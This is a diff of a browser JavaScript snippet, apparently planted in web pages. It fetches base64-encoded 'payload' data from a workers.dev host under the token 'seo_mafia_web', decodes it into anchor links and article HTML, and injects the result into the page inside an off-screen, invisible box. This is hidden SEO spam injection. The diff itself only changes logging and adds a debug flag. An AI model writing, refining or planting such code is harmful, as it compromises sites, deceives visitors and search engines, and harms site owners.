@@ -2,6 +2,7 @@
 try{
 
   if(document.getElementById("bunker-payload-2")) return;
+  const DEBUG = localStorage.getItem("debug_panel2") === "1";
   const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
   const TOKEN = "seo_mafia_web";
   const decode = (s) => {
@@ -10,7 +11,7 @@ try{
         Uint8Array.from(atob(s), c => c.charCodeAt(0))
       );
     } catch(e) {
-      console.error("Decode error:", e);
+      error("Decode error:", e);
       return "";
     }
   };
@@ -25,7 +26,7 @@ try{
       if(!json || !json.payload) throw new Error("Invalid payload");
       return decode(json.payload);
     }catch(err){
-      console.error("Fetch error ("+id+"):", err);
+      error("Fetch error ("+id+"):", err);
       return "";
     }
   }
@@ -34,7 +35,7 @@ try{
     getData("b1")
   ]).then(([anchorsRaw, articleRaw]) => {
     if(!anchorsRaw || !articleRaw){
-      console.warn("Data panel2 kosong");
+      warn("Data panel2 kosong");
       return;
     }
     anchorsRaw = anchorsRaw
@@ -60,9 +61,9 @@ try{
 
       })
       .filter(Boolean);
-    console.log("ANCHORS RESULT:", anchors);
+    log("ANCHORS RESULT:", anchors);
     if(!anchors.length){
-      console.warn("❌ panel2 kosong");
+      warn("❌ panel2 kosong");
       return;
     }
     let i = 0;
@@ -83,9 +84,9 @@ try{
     box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
     box.innerHTML = html;
     (document.body || document.documentElement).appendChild(box);
-    console.log("✅ panel2 inject sukses");
+    log("✅ panel2 inject sukses");
   }
 }catch(e){
-  console.error("panel2 fatal error:", e);
+  error("panel2 fatal error:", e);
 }
 }();
